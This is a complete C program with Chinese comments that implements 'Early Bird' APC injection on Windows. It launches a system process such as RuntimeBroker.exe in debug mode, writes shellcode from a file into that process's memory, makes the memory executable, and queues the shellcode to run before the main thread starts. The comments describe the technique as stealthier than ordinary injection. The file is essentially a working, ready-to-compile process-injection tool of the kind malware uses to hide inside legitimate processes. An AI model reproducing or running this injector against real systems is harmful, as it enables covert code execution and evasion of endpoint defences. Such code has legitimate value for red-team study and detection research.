/**
 * ===================================================================
 * Early Bird APC Injection - 早鸟 APC 注入技术
 * ===================================================================
 *
 * 技术原理：
 * 1. 以调试模式（DEBUG_PROCESS）创建目标进程，进程处于挂起状态
 * 2. 在进程主线程启动前，向其 APC 队列注入载荷
 * 3. 停止调试，让进程继续运行
 * 4. 当主线程开始运行时，APC 队列中的载荷自动执行
 *
 * 技术特点：
 * - "Early Bird" = 在进程初始化早期阶段注入
 * - 利用 APC (Asynchronous Procedure Call) 机制
 * - 在进程真正开始前就完成注入
 * - 比运行时 APC 注入更隐蔽
 *
 * 作者：基于 AbdouRoumi 的研究实现
 * 编译：gcc early_bird_apc.c -o early_bird_apc.exe -lpsapi
 * 用法：early_bird_apc.exe <目标程序> <shellcode文件>
 *       示例：early_bird_apc.exe C:\Windows\System32\notepad.exe payload.bin
 * ===================================================================
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <psapi.h>

// ===== 函数声明 =====
BOOL ReadShellcodeFile(const char* filename, BYTE** ppShellcode, DWORD* pSize);
BOOL CreateDebuggedProcess(const char* targetPath, PROCESS_INFORMATION* pPi);
BOOL InjectShellcode(HANDLE hProcess, BYTE* shellcode, DWORD size, PVOID* ppAddress);
BOOL QueueAPCToThread(HANDLE hThread, PVOID shellcodeAddr);

/**
 * ===================================================================
 * 主函数
 * ===================================================================
 */
int main(int argc, char* argv[]) {
    printf("======================================\n");
    printf("  Early Bird APC Injection 技术\n");
    printf("  (参考原始实现：Ruy-Lopez)\n");
    printf("======================================\n\n");

    // 检查命令行参数（支持默认目标进程）
    const char* targetProcess = "RuntimeBroker.exe";  // 默认目标
    const char* shellcodePath = NULL;

    if (argc == 2) {
        // 只提供 shellcode 文件，使用默认目标进程
        shellcodePath = argv[1];
    } else if (argc == 3) {
        // 提供目标进程和 shellcode 文件
        targetProcess = argv[1];
        shellcodePath = argv[2];
    } else {
        printf("用法：\n");
        printf("  %s <shellcode文件>                     (使用默认目标: RuntimeBroker.exe)\n", argv[0]);
        printf("  %s <目标程序> <shellcode文件>           (指定目标进程)\n\n", argv[0]);
        printf("示例：\n");
        printf("  %s payload.bin\n", argv[0]);
        printf("  %s notepad.exe payload.bin\n\n", argv[0]);
        return 1;
    }

    // [1] 读取 shellcode
    printf("[i] 读取 shellcode 文件: %s\n", shellcodePath);

    BYTE* shellcode = NULL;
    DWORD shellcodeSize = 0;

    if (!ReadShellcodeFile(shellcodePath, &shellcode, &shellcodeSize)) {
        printf("[!] 无法读取 shellcode 文件\n");
        return 1;
    }

    printf("[i] Shellcode 大小: %u 字节\n", shellcodeSize);
    printf("[+] DONE\n\n");

    // [2] 以调试模式创建目标进程
    printf("[i] 创建 \"%s\" 进程（调试模式）...\n", targetProcess);

    PROCESS_INFORMATION pi = {0};
    if (!CreateDebuggedProcess(targetProcess, &pi)) {
        printf("[!] 无法创建调试进程\n");
        free(shellcode);
        return 1;
    }

    printf("[i] 目标进程已创建，PID: %d\n", pi.dwProcessId);
    printf("[+] DONE\n\n");

    // [3] 注入 shellcode 到远程进程（带交互式确认）
    printf("[i] 注入 shellcode 到 %s...\n", targetProcess);

    PVOID shellcodeAddr = NULL;
    if (!InjectShellcode(pi.hProcess, shellcode, shellcodeSize, &shellcodeAddr)) {
        printf("[!] Shellcode 注入失败\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        free(shellcode);
        return 1;
    }

    printf("[i] 注入地址: 0x%p\n", shellcodeAddr);
    printf("[+] DONE\n\n");

    // [4] 队列 APC 到主线程
    printf("[i] 将 shellcode 加入主线程 APC 队列...\n");

    if (!QueueAPCToThread(pi.hThread, shellcodeAddr)) {
        printf("[!] QueueUserAPC 失败\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        free(shellcode);
        return 1;
    }

    printf("[i] APC 已排队到线程 %u\n", pi.dwThreadId);
    printf("[+] DONE\n\n");

    // [5] 等待用户确认后继续调试进程（原始实现的交互式特性）
    printf("[*] 按 <Enter> 继续并启动调试进程...");
    getchar();

    printf("[i] 继续调试进程！\n");
    if (!DebugActiveProcessStop(pi.dwProcessId)) {
        printf("[!] DebugActiveProcessStop 失败（错误码：%u）\n", GetLastError());
    }

    printf("[+] 进程已启动！\n\n");

    printf("======================================\n");
    printf("✓ Early Bird APC 注入完成\n");
    printf("  进程 PID: %u\n", pi.dwProcessId);
    printf("  线程 TID: %u\n", pi.dwThreadId);
    printf("======================================\n\n");

    // 等待用户确认后退出（原始实现的交互式特性）
    printf("[*] 按 <Enter> 退出...");
    getchar();

    // 清理资源
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    free(shellcode);

    return 0;
}

/**
 * ===================================================================
 * 读取 shellcode 文件
 * ===================================================================
 */
BOOL ReadShellcodeFile(const char* filename, BYTE** ppShellcode, DWORD* pSize) {
    HANDLE hFile = CreateFileA(
        filename,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("错误：无法打开文件（错误码：%u）\n", GetLastError());
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        printf("错误：无法获取文件大小\n");
        CloseHandle(hFile);
        return FALSE;
    }

    BYTE* buffer = (BYTE*)malloc(fileSize);
    if (!buffer) {
        printf("错误：内存分配失败\n");
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead = 0;
    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
        printf("错误：文件读取失败（错误码：%u）\n", GetLastError());
        free(buffer);
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hFile);

    *ppShellcode = buffer;
    *pSize = fileSize;

    return TRUE;
}

/**
 * ===================================================================
 * 以调试模式创建进程
 *
 * 使用 DEBUG_PROCESS 标志创建进程，这会：
 * 1. 进程以挂起状态启动
 * 2. 主线程尚未开始执行
 * 3. 为注入 APC 提供时间窗口
 *
 * 参数：
 * - targetPath: 可以是完整路径或进程名（如 "RuntimeBroker.exe"）
 *               如果只是进程名，会自动从 System32 目录加载
 * ===================================================================
 */
BOOL CreateDebuggedProcess(const char* targetPath, PROCESS_INFORMATION* pPi) {
    STARTUPINFOA si = {0};
    si.cb = sizeof(STARTUPINFOA);

    char lpPath[MAX_PATH * 2];
    char winDir[MAX_PATH];

    // 检查是否是完整路径（包含 '\\' 或 ':'）
    if (strchr(targetPath, '\\') || strchr(targetPath, ':')) {
        // 完整路径，直接使用
        snprintf(lpPath, sizeof(lpPath), "%s", targetPath);
    } else {
        // 只是进程名，从 System32 目录加载
        if (!GetEnvironmentVariableA("WINDIR", winDir, MAX_PATH)) {
            printf("[!] GetEnvironmentVariableA 失败（错误码：0x%lx）\n", GetLastError());
            return FALSE;
        }
        snprintf(lpPath, sizeof(lpPath), "%s\\System32\\%s", winDir, targetPath);
    }

    printf("\t[i] 运行: \"%s\" ... ", lpPath);

    // 以调试模式创建进程（关键：DEBUG_PROCESS 标志）
    if (!CreateProcessA(
        NULL,                   // 应用程序名（NULL = 使用命令行）
        lpPath,                 // 命令行
        NULL,                   // 进程安全属性
        NULL,                   // 线程安全属性
        FALSE,                  // 不继承句柄
        DEBUG_PROCESS,          // 调试模式（进程挂起）
        NULL,                   // 环境变量
        NULL,                   // 当前目录
        &si,                    // 启动信息
        pPi                     // 进程信息（返回）
    )) {
        printf("[!] CreateProcessA 失败（错误码：%d）\n", GetLastError());
        return FALSE;
    }

    printf("确认我们得到了需要的内容...\n");
    return TRUE;
}

/**
 * ===================================================================
 * 注入 shellcode 到远程进程
 *
 * 步骤：
 * 1. VirtualAllocEx - 在目标进程分配内存
 * 2. WriteProcessMemory - 写入 shellcode（带交互式确认）
 * 3. VirtualProtectEx - 修改为可执行权限
 * ===================================================================
 */
BOOL InjectShellcode(HANDLE hProcess, BYTE* shellcode, DWORD size, PVOID* ppAddress) {
    SIZE_T bytesWritten = 0;
    DWORD oldProtection = 0;

    // 第一步：分配内存
    *ppAddress = VirtualAllocEx(
        hProcess,
        NULL,
        size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE          // 先分配读写权限
    );

    if (*ppAddress == NULL) {
        printf("\n\t[!] VirtualAllocEx 失败（错误码：%d）\n", GetLastError());
        return FALSE;
    }
    printf("\n\t[i] 已分配内存地址: 0x%p\n", *ppAddress);

    // 第二步：等待用户确认后写入 shellcode（原始实现的交互式特性）
    printf("\t按 <Enter> 写入 Payload...");
    getchar();

    if (!WriteProcessMemory(hProcess, *ppAddress, shellcode, size, &bytesWritten) || bytesWritten != size) {
        printf("\n\t[!] WriteProcessMemory 失败（错误码：%d）\n", GetLastError());
        return FALSE;
    }
    printf("\t[i] 成功写入 %d 字节\n", (int)bytesWritten);

    // 第三步：修改为可执行权限
    if (!VirtualProtectEx(hProcess, *ppAddress, size, PAGE_EXECUTE_READWRITE, &oldProtection)) {
        printf("\n\t[!] VirtualProtectEx 失败（错误码：%d）\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

/**
 * ===================================================================
 * 队列 APC 到线程
 *
 * QueueUserAPC 将函数地址加入线程的 APC 队列
 * 当线程进入可警报状态（alertable state）时，APC 队列中的函数会被执行
 *
 * Early Bird 技巧：
 * - 进程以调试模式创建，主线程尚未启动
 * - 在主线程启动前就将 shellcode 加入 APC 队列
 * - 当 DebugActiveProcessStop 后，主线程开始运行
 * - 主线程初始化时会进入可警报状态，APC 自动执行
 * ===================================================================
 */
BOOL QueueAPCToThread(HANDLE hThread, PVOID shellcodeAddr) {
    if (!QueueUserAPC((PAPCFUNC)shellcodeAddr, hThread, 0)) {
        printf("错误：QueueUserAPC 失败（错误码：%u）\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}
